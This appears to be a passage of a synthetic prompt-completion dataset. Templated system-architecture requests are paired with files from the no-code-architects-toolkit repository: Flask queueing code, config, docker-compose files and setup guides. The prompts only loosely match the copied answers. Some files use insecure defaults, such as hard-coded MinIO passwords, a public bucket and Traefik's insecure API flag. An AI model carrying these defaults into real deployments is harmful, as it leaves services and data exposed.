\"queue_id\": queue_id,\n                        \"process_id\": pid,\n                        \"response\": None\n                    })\n                    \n                    response = f(job_id=job_id, data=data, *args, **kwargs)\n                    run_time = time.time() - start_time\n                    \n                    response_obj = {\n                        \"code\": response[2],\n                        \"id\": data.get(\"id\"),\n                        \"job_id\": job_id,\n                        \"response\": response[0] if response[2] == 200 else None,\n                        \"message\": \"success\" if response[2] == 200 else response[0],\n                        \"run_time\": round(run_time, 3),\n                        \"queue_time\": 0,\n                        \"total_time\": round(run_time, 3),\n                        \"pid\": pid,\n                        \"queue_id\": queue_id,\n                        \"queue_length\": task_queue.qsize(),\n                        \"build_number\": BUILD_NUMBER  # Add build number to response\n                    }\n                    \n                    # Log job status as done\n                    log_job_status(job_id, {\n                        \"job_status\": \"done\",\n                        \"job_id\": job_id,\n                        \"queue_id\": queue_id,\n                        \"process_id\": pid,\n                        \"response\": response_obj\n                    })\n                    \n                    return response_obj, response[2]\n                else:\n                    if MAX_QUEUE_LENGTH > 0 and task_queue.qsize() >= MAX_QUEUE_LENGTH:\n                        error_response = {\n                            \"code\": 429,\n                            \"id\": data.get(\"id\"),\n                            \"job_id\": job_id,\n                            \"message\": f\"MAX_QUEUE_LENGTH ({MAX_QUEUE_LENGTH}) reached\",\n                            \"pid\": pid,\n                            \"queue_id\": queue_id,\n                            \"queue_length\": task_queue.qsize(),\n                            \"build_number\": BUILD_NUMBER  # Add build number to response\n                        }\n                        \n                        # Log the queue overflow error\n                        log_job_status(job_id, {\n                            \"job_status\": \"done\",\n                            \"job_id\": job_id,\n                            \"queue_id\": queue_id,\n                            \"process_id\": pid,\n                            \"response\": error_response\n                        })\n                        \n                        return error_response, 429\n                    \n                    # Log job status as queued\n                    log_job_status(job_id, {\n                        \"job_status\": \"queued\",\n                        \"job_id\": job_id,\n                        \"queue_id\": queue_id,\n                        \"process_id\": pid,\n                        \"response\": None\n                    })\n                    \n                    task_queue.put((job_id, data, lambda: f(job_id=job_id, data=data, *args, **kwargs), start_time))\n                    \n                    return {\n                        \"code\": 202,\n                        \"id\": data.get(\"id\"),\n                        \"job_id\": job_id,\n                        \"message\": \"processing\",\n                        \"pid\": pid,\n                        \"queue_id\": queue_id,\n                        \"max_queue_length\": MAX_QUEUE_LENGTH if MAX_QUEUE_LENGTH > 0 else \"unlimited\",\n                        \"queue_length\": task_queue.qsize(),\n                        \"build_number\": BUILD_NUMBER  # Add build number to response\n                    }, 202\n            return wrapper\n        return decorator\n\n    app.queue_task = queue_task\n\n    # Register special route for Next.js root asset paths first\n    from routes.v1.media.feedback import create_root_next_routes\n    create_root_next_routes(app)\n    \n    # Use the discover_and_register_blueprints function to register all blueprints\n    discover_and_register_blueprints(app)\n\n    return app\n\napp = create_app()\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "app.py", "language": "python", "complexity": "complex", "star_count": 1557, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 204}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2025 Stephen G. Pope\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\n\n\nfrom flask import request, jsonify, current_app\nfrom functools import wraps\nimport jsonschema\nimport os\nimport json\nimport time\nfrom config import LOCAL_STORAGE_PATH\n\ndef validate_payload(schema):\n    def decorator(f):\n        @wraps(f)\n        def decorated_function(*args, **kwargs):\n            if not request.json:\n                return jsonify({\"message\": \"Missing JSON in request\"}), 400\n            try:\n                jsonschema.validate(instance=request.json, schema=schema)\n            except jsonschema.exceptions.ValidationError as validation_error:\n                return jsonify({\"message\": f\"Invalid payload: {validation_error.message}\"}), 400\n            \n            return f(*args, **kwargs)\n        return decorated_function\n    return decorator\n\ndef log_job_status(job_id, data):\n    \"\"\"\n    Log job status to a file in the STORAGE_PATH/jobs folder\n    \n    Args:\n        job_id (str): The unique job ID\n        data (dict): Data to write to the log file\n    \"\"\"\n    jobs_dir = os.path.join(LOCAL_STORAGE_PATH, 'jobs')\n    \n    # Create jobs directory if it doesn't exist\n    if not os.path.exists(jobs_dir):\n        os.makedirs(jobs_dir, exist_ok=True)\n    \n    # Create or update the job log file\n    job_file = os.path.join(jobs_dir, f\"{job_id}.json\")\n    \n    # Write data directly to file\n    with open(job_file, 'w') as f:\n        json.dump(data, f, indent=2)\n\ndef queue_task_wrapper(bypass_queue=False):\n    def decorator(f):\n        def wrapper(*args, **kwargs):\n            return current_app.queue_task(bypass_queue=bypass_queue)(f)(*args, **kwargs)\n        return wrapper\n    return decorator\n\ndef discover_and_register_blueprints(app, base_dir='routes'):\n    \"\"\"\n    Dynamically discovers and registers all Flask blueprints in the routes directory.\n    Recursively searches all subdirectories for Python modules containing Blueprint instances.\n    \n    Args:\n        app (Flask): The Flask application instance\n        base_dir (str): Base directory to start searching for blueprints (default: 'routes')\n    \"\"\"\n    import importlib\n    import pkgutil\n    import inspect\n    import sys\n    import os\n    from flask import Blueprint\n    import logging\n    import glob\n\n    logger = logging.getLogger(__name__)\n    logger.info(f\"Discovering blueprints in {base_dir}\")\n    \n    # Add the current working directory to sys.path if it's not already there\n    cwd = os.getcwd()\n    if cwd not in sys.path:\n        sys.path.insert(0, cwd)\n    \n    # Get the absolute path to the base directory\n    if not os.path.isabs(base_dir):\n        base_dir = os.path.join(cwd, base_dir)\n    \n    registered_blueprints = set()\n    \n    # Find all Python files in the routes directory, including subdirectories\n    python_files = glob.glob(os.path.join(base_dir, '**', '*.py'), recursive=True)\n    logger.info(f\"Found {len(python_files)} Python files in {base_dir}\")\n    \n    for file_path in python_files:\n        try:\n            # Convert file path to import path\n            rel_path = os.path.relpath(file_path, cwd)\n            # Remove .py extension\n            module_path = os.path.splitext(rel_path)[0]\n            # Convert path separators to dots for import\n            module_path = module_path.replace(os.path.sep, '.')\n            \n            # Skip __init__.py files\n            if module_path.endswith('__init__'):\n                continue\n                \n            #logger.info(f\"Attempting to import module: {module_path}\")\n            \n            # Import the module\n            module = importlib.import_module(module_path)\n            \n            # Find all Blueprint instances in the module\n            for name, obj in inspect.getmembers(module):\n                if isinstance(obj, Blueprint) and obj not in registered_blueprints:\n                    pid = os.getpid()\n                    logger.info(f\"PID {pid} Registering: {module_path}\")\n                    app.register_blueprint(obj)\n                    registered_blueprints.add(obj)\n            \n        except Exception as e:\n            logger.error(f\"Error importing module {module_path}: {str(e)}\")\n    \n    logger.info(f\"PID {pid} Registered {len(registered_blueprints)} blueprints\")\n    return registered_blueprints", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "app_utils.py", "language": "python", "complexity": "medium", "star_count": 1557, "quality_score": 0.84, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 136}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2025 Stephen G. Pope\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\n\n\nimport os\nimport logging\n\n# Retrieve the API key from environment variables\nAPI_KEY = os.environ.get('API_KEY')\nif not API_KEY:\n    raise ValueError(\"API_KEY environment variable is not set\")\n\n# Storage path setting\nLOCAL_STORAGE_PATH = os.environ.get('LOCAL_STORAGE_PATH', '/tmp')\n\n# GCP environment variables\nGCP_SA_CREDENTIALS = os.environ.get('GCP_SA_CREDENTIALS', '')\nGCP_BUCKET_NAME = os.environ.get('GCP_BUCKET_NAME', '')\n\ndef validate_env_vars(provider):\n\n    \"\"\" Validate the necessary environment variables for the selected storage provider \"\"\"\n    required_vars = {\n        'GCP': ['GCP_BUCKET_NAME', 'GCP_SA_CREDENTIALS'],\n        'S3': ['S3_ENDPOINT_URL', 'S3_ACCESS_KEY', 'S3_SECRET_KEY', 'S3_BUCKET_NAME', 'S3_REGION'],\n        'S3_DO': ['S3_ENDPOINT_URL', 'S3_ACCESS_KEY', 'S3_SECRET_KEY']\n    }\n    \n    missing_vars = [var for var in required_vars[provider] if not os.getenv(var)]\n    if missing_vars:\n        raise ValueError(f\"Missing environment variables for {provider} storage: {', '.join(missing_vars)}\")\n", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "config.py", "language": "python", "complexity": "simple", "star_count": 1557, "quality_score": 0.75, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 46}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Local Development with MinIO and n8n\n\nThis setup provides a complete local development environment for the No Code Architect Toolkit with integrated MinIO S3-compatible storage and n8n workflow automation.\n\n## What's Included\n\n- **NCA Toolkit**: Built locally from source (no pre-built image required)\n- **MinIO**: S3-compatible object storage with web console for local file management\n- **n8n**: Workflow automation platform for connecting and orchestrating services\n- **Custom Network**: All services communicate through a dedicated Docker network\n- **Persistent Storage**: Data persists between container restarts\n\n## Prerequisites\n\n- Docker and Docker Compose installed\n- Git (to clone the repository)\n- At least 2GB available RAM\n- At least 5GB available disk space\n\n---\n\n## Quick Start\n\n### 1. Prepare Environment Configuration\n\nCopy the example environment file and customize it:\n\n```bash\ncp .env.local.minio.n8n.example .env.local.minio.n8n\n```\n\nEdit `.env.local.minio.n8n` with your preferred settings. The defaults work for most local development scenarios.\n\n### 2. Start the Development Environment\n\n```bash\ndocker compose -f docker-compose.local.minio.n8n.yml up -d\n```\n\n### 3. Access the Applications\n\nOnce all services are running, you can access:\n\n- **NCA Toolkit API**: http://localhost:8080\n- **n8n Workflow Interface**: http://localhost:5678\n- **MinIO Console**: http://localhost:9001\n  - Username: `minioadmin`\n  - Password: `minioadmin123`\n\n### 4. Verify Setup\n\nTest the NCA Toolkit API:\n\n```bash\ncurl -H \"x-api-key: local-dev-key-123\" http://localhost:8080/v1/toolkit/test\n```\n\n---\n\n## Environment Configuration\n\nThe `.env.local.minio.n8n` file contains all necessary configuration:\n\n### Application Settings\n```env\nAPP_NAME=NCAToolkit\nAPP_DEBUG=true\nAPP_DOMAIN=localhost:8080\nAPP_URL=http://localhost:8080\nAPI_KEY=local-dev-key-123\n```\n\n### MinIO S3 Storage Settings\n```env\nS3_ENDPOINT_URL=http://minio:9000\nS3_ACCESS_KEY=minioadmin\nS3_SECRET_KEY=minioadmin123\nS3_REGION=us-east-1\nS3_BUCKET_NAME=nca-toolkit-local\n```\n\n### n8n Configuration\n```env\nN8N_HOST=localhost\nN8N_PORT=5678\nN8N_PROTOCOL=http\nWEBHOOK_URL=http://localhost:5678/\n```\n\n---\n\n## Service Details\n\n### NCA Toolkit (Port 8080)\n- Built from local Dockerfile\n- Connects to MinIO for file storage\n- API accessible at http://localhost:8080\n- Uses local development API key: `local-dev-key-123`\n\n### MinIO (Ports 9000, 9001)\n- **API Endpoint**: http://localhost:9000 (S3-compatible API)\n- **Web Console**: http://localhost:9001\n- **Bucket**: `nca-toolkit-local` (auto-created and configured as public)\n- **Credentials**: minioadmin / minioadmin123\n\n### n8n (Port 5678)\n- **Web Interface**: http://localhost:5678\n- **Webhook URL**: http://localhost:5678/\n- **File Sharing**: `./local-files` directory mounted for easy file access\n- Can connect to both NCA Toolkit and MinIO services\n\n---\n\n## Development Workflow\n\n### Making Code Changes\n\n1. **Edit source code** in your local directory\n2. **Rebuild the NCA Toolkit container**:\n   ```bash\n   docker compose -f docker-compose.local.minio.n8n.yml build ncat\n   docker compose -f docker-compose.local.minio.n8n.yml up -d\n   ```\n\n### Viewing Logs\n\n```bash\n# All services\ndocker compose -f docker-compose.local.minio.n8n.yml logs -f\n\n# Specific service\ndocker compose -f docker-compose.local.minio.n8n.yml logs -f ncat\ndocker compose -f docker-compose.local.minio.n8n.yml logs -f minio\ndocker compose -f docker-compose.local.minio.n8n.yml logs -f n8n\n```\n\n### Managing Storage\n\n#### Access MinIO Console\n1. Open http://localhost:9001\n2. Login with `minioadmin` / `minioadmin123`\n3. Browse the `nca-toolkit-local` bucket\n4. Upload/download files as needed\n\n#### Reset MinIO Data\n```bash\ndocker compose -f docker-compose.local.minio.n8n.yml down\ndocker volume rm no-code-architects-toolkit_minio_data\ndocker compose -f docker-compose.local.minio.n8n.yml up -d\n```\n\n---\n\n## Service Communication\n\nAll services communicate through the `nca-network` Docker network:\n\n- **n8n → NCA Toolkit**: `http://ncat:8080`\n- **n8n → MinIO**: `http://minio:9000` (S3 API)\n- **NCA Toolkit → MinIO**: `http://minio:9000` (internal network)\n\n### n8n Integration with NCA Toolkit\n\n#### Quick Test Setup\n\n1. **Access n8n**: Open http://localhost:5678\n2. **Create a new workflow**\n3. **Add an HTTP Request node** with these settings:\n   - **Method**: GET\n   - **URL**: `http://ncat:8080/v1/toolkit/test`\n   - **Headers**: \n     - Key: `x-api-key`\n     - Value: `local-dev-key-123`\n\n#### Example: Testing the Toolkit Connection\n\n**HTTP Request Node Configuration:**\n```json\n{\n  \"method\": \"GET\",\n  \"url\": \"http://ncat:8080/v1/toolkit/test\",\n  \"headers\": {\n    \"x-api-key\": \"local-dev-key-123\"\n  }\n}\n```\n\n**Expected Response:**\n```json\n{\n  \"message\": \"NCA Toolkit is working correctly\",\n  \"status\": \"success\"\n}\n```\n\n#### Example: Media Processing Workflow\n\n**HTTP Request Node for Media Transcription:**\n```json\n{\n  \"method\": \"POST\",\n  \"url\": \"http://ncat:8080/v1/media/transcribe\",\n  \"headers\": {\n    \"x-api-key\": \"local-dev-key-123\",\n    \"Content-Type\": \"application/json\"\n  },\n  \"body\": {\n    \"media_url\": \"https://example.com/audio.mp3\",\n    \"language\": \"en\",\n    \"response_format\": \"json\"\n  }\n}\n```\n\n#### All Available NCA Toolkit Endpoints\n\nUse the base URL `http://ncat:8080` with any of the API endpoints documented in the main README:\n\n- `http://ncat:8080/v1/toolkit/test` - Test connection\n- `http://ncat:8080/v1/media/transcribe` - Transcribe audio/video\n- `http://ncat:8080/v1/video/caption` - Add captions to videos\n- `http://ncat:8080/v1/image/screenshot/webpage` - Screenshot web pages\n- And all other endpoints listed in the main documentation\n\n#### Tips for n8n Integration\n\n1. **Always use the internal network URL**: `http://ncat:8080` (not `http://localhost:8080`)\n2. **Include the API key header**: `x-api-key: local-dev-key-123`\n3. **For file uploads**: Use the MinIO integration or webhook URLs for large files\n4. **Error handling**: Add error handling nodes to manage API timeouts or failures\n\n---\n\n## Data Persistence\n\nThe following data persists between container restarts:\n\n- **Application Storage**: `storage` volume (`/app/storage`)\n- **Application Logs**: `logs` volume (`/app/logs`)\n- **MinIO Data**: `minio_data` volume\n- **n8n Workflows**: `n8n_data` volume (`/home/node/.n8n`)\n- **Shared Files**: `./local-files` directory\n\n---\n\n## Troubleshooting\n\n### Services Won't Start\n```bash\n# Check service status\ndocker compose -f docker-compose.local.minio.n8n.yml ps\n\n# View error logs\ndocker compose -f docker-compose.local.minio.n8n.yml logs\n```\n\n### Port Conflicts\nIf ports 8080, 5678, 9000, or 9001 are already in use, modify the port mappings in `docker-compose.local.minio.n8n.yml`:\n\n```yaml\nports:\n  - \"8081:8080\"  # Change 8080 to 8081\n```\n\n### MinIO Bucket Issues\nThe `minio-init` service automatically creates and configures the bucket. If issues occur:\n\n```bash\n# Restart the init service\ndocker compose -f docker-compose.local.minio.n8n.yml restart minio-init\n\n# Check init logs\ndocker compose -f docker-compose.local.minio.n8n.yml logs minio-init\n```\n\n### API Authentication Errors\nEnsure you're using the correct API key from `.env.local.minio.n8n`:\n- Default: `local-dev-key-123`\n- Header: `x-api-key: local-dev-key-123`\n\n---\n\n## Stopping the Environment\n\n```bash\n# Stop all services\ndocker compose -f docker-compose.local.minio.n8n.yml down\n\n# Stop and remove volumes (deletes all data)\ndocker compose -f docker-compose.local.minio.n8n.yml down -v\n```\n\n---\n\n## Architecture Overview\n\n```\n┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐\n│   NCA Toolkit   │    │       n8n       │    │     MinIO       │\n│   localhost:8080│◄──►│   localhost:5678│◄──►│  localhost:9000 │\n│                 │    │                 │    │  (S3 API)       │\n└─────────────────┘    └─────────────────┘    └─────────────────┘\n         │                       │                       │\n         └───────────────────────┼───────────────────────┘\n                                 │\n                      ┌─────────────────┐\n                      │  MinIO Console  │\n                      │  localhost:9001 │\n                      └─────────────────┘\n                                 │\n                      ┌─────────────────┐\n                      │  nca-network    │\n                      │ (Docker Bridge) │\n                      └─────────────────┘\n```\n\nThis setup provides a complete local development environment with file storage, workflow automation, and the NCA Toolkit API all working together seamlessly.", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docker-compose.local.minio.n8n.md", "language": "markdown", "complexity": "complex", "star_count": 1557, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 317}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "services:\n  ncat:\n    build: .\n    env_file:\n      - .env.local.minio.n8n\n    ports:\n      - \"8080:8080\"\n    volumes:\n      - storage:/app/storage\n      - logs:/app/logs\n    restart: unless-stopped\n    depends_on:\n      - minio\n      - minio-init\n    networks:\n      - nca-network\n\n  minio:\n    image: minio/minio:latest\n    command: server /data --console-address \":9001\"\n    ports:\n      - \"9000:9000\"\n      - \"9001:9001\"\n    environment:\n      MINIO_ROOT_USER: minioadmin\n      MINIO_ROOT_PASSWORD: minioadmin123\n    volumes:\n      - minio_data:/data\n    restart: unless-stopped\n    networks:\n      - nca-network\n\n  minio-init:\n    image: minio/mc:latest\n    depends_on:\n      - minio\n    entrypoint: >\n      /bin/sh -c \"\n      sleep 5;\n      /usr/bin/mc alias set myminio http://minio:9000 minioadmin minioadmin123;\n      /usr/bin/mc mb myminio/nca-toolkit-local --ignore-existing;\n      /usr/bin/mc anonymous set public myminio/nca-toolkit-local;\n      echo 'MinIO bucket nca-toolkit-local created and configured as public';\n      \"\n    networks:\n      - nca-network\n\n  n8n:\n    image: docker.n8n.io/n8nio/n8n\n    restart: unless-stopped\n    ports:\n      - \"5678:5678\"\n    environment:\n      - N8N_HOST=localhost\n      - N8N_PORT=5678\n      - N8N_PROTOCOL=http\n      - NODE_ENV=production\n      - WEBHOOK_URL=http://localhost:5678/\n      - GENERIC_TIMEZONE=UTC\n      - N8N_SECURE_COOKIE=false\n    volumes:\n      - n8n_data:/home/node/.n8n\n      - ./local-files:/files\n    networks:\n      - nca-network\n\nvolumes:\n  storage:\n    driver: local\n  logs:\n    driver: local\n  minio_data:\n    driver: local\n  n8n_data:\n    driver: local\n\nnetworks:\n  nca-network:\n    driver: bridge", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docker-compose.local.minio.n8n.yml", "language": "yaml", "complexity": "simple", "star_count": 1557, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 79}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Install No Code Architect Toolkit with Docker\n\nInstallation of No Code Architect Toolkit with Docker offers the following advantages:\n- Install No Code Architect Toolkit in a clean environment.\n- Simplify the setup process.\n- Avoid compatibility issues across different operating systems with Docker's consistent environment.\n\n> **Info**  \n> If your domain/subdomain is already pointed to the server, start at step 2.  \n> If you have already installed Docker and Docker-Compose, start at step 3.\n\n---\n\n## 1. DNS Setup\n\nPoint your domain/subdomain to the server. Add an A record to route the domain/subdomain accordingly:\n\n- **Type**: A  \n- **Name**: The desired domain/subdomain  \n- **IP Address**: `<IP_OF_YOUR_SERVER>`  \n\n---\n\n## 2. Install Docker\n\nThis can vary depending on the Linux distribution used. Below are instructions for Ubuntu:\n\n### Set up Docker's APT Repository\n\n```bash\n# Add Docker's official GPG key:\nsudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n\n# Add the repository to APT sources:\necho \\\n\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n$(. /etc/os-release && echo \"$VERSION_CODENAME\") stable\" | \\\nsudo tee /etc/apt/sources.list.d/docker.list > /dev/null\nsudo apt-get update\n```\n\n### Install the Docker Packages\n\n```bash\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n```\n\n---\n\n## 3. Create Docker Compose File\n\nCreate a `docker-compose.yml` file and paste the following configuration:\n\n### With SSL Support\nEnables SSL/TLS for secure, encrypted communications. Ideal for those wanting a hands-off approach to SSL setup.\n\n```yaml\nservices:\n  traefik:\n    image: \"traefik\"\n    restart: unless-stopped\n    command:\n      - \"--api=true\"\n      - \"--api.insecure=true\"\n      - \"--providers.docker=true\"\n      - \"--providers.docker.exposedbydefault=false\"\n      - \"--entrypoints.web.address=:80\"\n      - \"--entrypoints.web.http.redirections.entryPoint.to=websecure\"\n      - \"--entrypoints.web.http.redirections.entrypoint.scheme=https\"\n      - \"--entrypoints.websecure.address=:443\"\n      - \"--certificatesresolvers.mytlschallenge.acme.tlschallenge=true\"\n      - \"--certificatesresolvers.mytlschallenge.acme.email=${SSL_EMAIL}\"\n      - \"--certificatesresolvers.mytlschallenge.acme.storage=/letsencrypt/acme.json\"\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - traefik_data:/letsencrypt\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n  ncat:\n    image: stephengpope/no-code-architects-toolkit:latest\n    env_file:\n      - .env\n    labels:\n      - traefik.enable=true\n      - traefik.http.routers.ncat.rule=Host(`${APP_DOMAIN}`)\n      - traefik.http.routers.ncat.tls=true\n      - traefik.http.routers.ncat.entrypoints=web,websecure\n      - traefik.http.routers.ncat.tls.certresolver=mytlschallenge\n    volumes:\n      - storage:/var/www/html/storage/app\n      - logs:/var/www/html/storage/logs\n    restart: unless-stopped\n\nvolumes:\n  traefik_data:\n    driver: local\n  storage:\n    driver: local\n  logs:\n    driver: local\n```\n\n---\n\n## 4. Create `.env` File\n\nCreate an `.env` file and configure it accordingly:\n\n```env\n# The name of your application.\nAPP_NAME=NCAToolkit\n\n# Debug mode setting. Set to `false` for production environments.\nAPP_DEBUG=false\n\n# Your app's domain or subdomain, without the 'http://' or 'https://' prefix.\nAPP_DOMAIN=example.com\n\n# Full application URL is automatically configured; no modification required.\nAPP_URL=https://${APP_DOMAIN}\n\n# SSL settings\nSSL_EMAIL=user@example.com\n\n# API_KEY\n# Purpose: Used for API authentication.\n# Requirement: Mandatory.\nAPI_KEY=your_api_key_here\n\n# s3 Compatible Storage Env Vars\n#\n#S3_ACCESS_KEY=your_access_key\n#S3_SECRET_KEY=your_secret_key\n#S3_ENDPOINT_URL=https://your-endpoint-url\n#S3_REGION=your-region\n#S3_BUCKET_NAME=your-bucket-name\n\n\n# Google Cloud Storage Env Variables\n#\n# GCP_SA_CREDENTIALS\n# Purpose: The JSON credentials for the GCP Service Account.\n# Requirement: Mandatory if using GCP storage.\n#GCP_SA_CREDENTIALS=/path/to/your/gcp/service_account.json\n\n# GCP_BUCKET_NAME\n# Purpose: The name of the GCP storage bucket.\n# Requirement: Mandatory if using GCP storage.\n#GCP_BUCKET_NAME=your_gcp_bucket_name\n\n# STORAGE_PATH\n# Purpose: The base path for storage operations.\n# Default: GCP\n# Requirement: Optional.\n#STORAGE_PATH=GCP\n\n```\n\n---\n\n## 5. Start Docker Compose\n\nStart No Code Architect Toolkit  using the following command:\n\n```bash\ndocker compose up -d\n```\n\nTo view logs in real time:\n\n```bash\ndocker compose logs -f\n```\n\nTo stop the containers:\n\n```bash\ndocker compose stop\n```\n\nTo restart and reload env vars\n\n# First update your .env file with the correct values\n# Then run:\n\n```bash\ndocker compose up -d --force-recreate ncat\n```\n\n---\n\n## 6. Done\n\nNo Code Architect Toolkit is now accessible through the specified APP_URL. For example:  \n[https://example.com](https://example.com)\n", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docker-compose.md", "language": "markdown", "complexity": "complex", "star_count": 1557, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 201}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "services:\n  traefik:\n    image: \"traefik\"\n    restart: unless-stopped\n    command:\n      - \"--api=true\"\n      - \"--api.insecure=true\"\n      - \"--providers.docker=true\"\n      - \"--providers.docker.exposedbydefault=false\"\n      - \"--entrypoints.web.address=:80\"\n      - \"--entrypoints.web.http.redirections.entryPoint.to=websecure\"\n      - \"--entrypoints.web.http.redirections.entrypoint.scheme=https\"\n      - \"--entrypoints.websecure.address=:443\"\n      - \"--certificatesresolvers.mytlschallenge.acme.tlschallenge=true\"\n      - \"--certificatesresolvers.mytlschallenge.acme.email=${SSL_EMAIL}\"\n      - \"--certificatesresolvers.mytlschallenge.acme.storage=/letsencrypt/acme.json\"\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - traefik_data:/letsencrypt\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n  ncat:\n    image: stephengpope/no-code-architects-toolkit:latest\n    env_file:\n      - .env\n    labels:\n      - traefik.enable=true\n      - traefik.http.routers.ncat.rule=Host(`${APP_DOMAIN}`)\n      - traefik.http.routers.ncat.tls=true\n      - traefik.http.routers.ncat.entrypoints=web,websecure\n      - traefik.http.routers.ncat.tls.certresolver=mytlschallenge\n    volumes:\n      - storage:/var/www/html/storage/app\n      - logs:/var/www/html/storage/logs\n    restart: unless-stopped\n\nvolumes:\n  traefik_data:\n    driver: local\n  storage:\n    driver: local\n  logs:\n    driver: local", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docker-compose.yml", "language": "yaml", "complexity": "simple", "star_count": 1557, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 44}, "authority_level": "medium", "authentic": true}}
